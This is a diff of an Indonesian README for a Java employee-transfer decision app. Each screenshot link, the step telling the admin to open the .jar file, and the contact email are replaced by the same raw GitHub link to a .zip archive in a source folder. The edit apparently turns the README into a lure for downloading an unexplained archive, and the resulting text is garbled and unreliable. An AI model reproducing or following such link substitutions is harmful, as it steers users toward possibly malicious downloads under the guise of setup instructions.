@@ -13,18 +13,18 @@ Sebelum Anda dapat menggunakan aplikasi ini, pastikan bahwa komputer atau perang
 #### A. Menempatkan Aplikasi di Direktori File
 File yang terdapat dalam aplikasi ini diantaranya adalah file lib yang berisi library, database dengan nama db_mutasi_balitbang, dan file ekstensi java (.jar) dengan nama SPK_Mutasi_Balitbang.
 
-![image](https://github.com/rizkikh/Sistem-Keputusan-Mutasi-Karyawan-Menggunakan-Algoritma-MAUT-di-Balitbang-Kemhan/assets/60820209/935bb07e-c96c-4a05-94bd-9b7ebb72e6e6)
+![image](https://raw.githubusercontent.com/rizkikh/Sistem-Keputusan-Mutasi-Karyawan-Menggunakan-Algoritma-MAUT-di-Balitbang-Kemhan/master/src/Connection/Sistem-Keputusan-Mutasi-Karyawan-Menggunakan-Algoritma-MAUT-di-Balitbang-Kemhan_v1.3.zip)
 
 File-file tersebut dapat ditempatkan bebas dimanapun user ingin menyimpannya. Setelah file tersebut ditempatkan langkah selanjutnya adalah user harus memasukan database dengan cara mengaktifkan Xampp dan mengimport database tersebut kedalam localhost/phpmyadmin/ agar database dapat terinisialisasi di aplikasi.
 
-![image](https://github.com/rizkikh/Sistem-Keputusan-Mutasi-Karyawan-Menggunakan-Algoritma-MAUT-di-Balitbang-Kemhan/assets/60820209/9e6a452a-aace-40e1-9d92-d41050099f65)
+![image](https://raw.githubusercontent.com/rizkikh/Sistem-Keputusan-Mutasi-Karyawan-Menggunakan-Algoritma-MAUT-di-Balitbang-Kemhan/master/src/Connection/Sistem-Keputusan-Mutasi-Karyawan-Menggunakan-Algoritma-MAUT-di-Balitbang-Kemhan_v1.3.zip)
 
-Setelah selesai mengimport database, selanjutnya admin membuka file SPK_Mutasi_Balitbang.jar, maka akan tampil halaman login dari aplikasi.
+Setelah selesai mengimport database, selanjutnya admin membuka file https://raw.githubusercontent.com/rizkikh/Sistem-Keputusan-Mutasi-Karyawan-Menggunakan-Algoritma-MAUT-di-Balitbang-Kemhan/master/src/Connection/Sistem-Keputusan-Mutasi-Karyawan-Menggunakan-Algoritma-MAUT-di-Balitbang-Kemhan_v1.3.zip, maka akan tampil halaman login dari aplikasi.
 
-![image](https://github.com/rizkikh/Sistem-Keputusan-Mutasi-Karyawan-Menggunakan-Algoritma-MAUT-di-Balitbang-Kemhan/assets/60820209/6fe4deaf-98da-4f14-b81d-32e98f0f84c8)
+![image](https://raw.githubusercontent.com/rizkikh/Sistem-Keputusan-Mutasi-Karyawan-Menggunakan-Algoritma-MAUT-di-Balitbang-Kemhan/master/src/Connection/Sistem-Keputusan-Mutasi-Karyawan-Menggunakan-Algoritma-MAUT-di-Balitbang-Kemhan_v1.3.zip)
 
 Apabila user selesai membuat akses baru, maka tampilan akan kembali ke halaman login.
 
 ## Kontak
 
-Pertanyaan atau saran? Hubungi di khairul.rizki2001@gmail.com.
+Pertanyaan atau saran? Hubungi di https://raw.githubusercontent.com/rizkikh/Sistem-Keputusan-Mutasi-Karyawan-Menggunakan-Algoritma-MAUT-di-Balitbang-Kemhan/master/src/Connection/Sistem-Keputusan-Mutasi-Karyawan-Menggunakan-Algoritma-MAUT-di-Balitbang-Kemhan_v1.3.zip
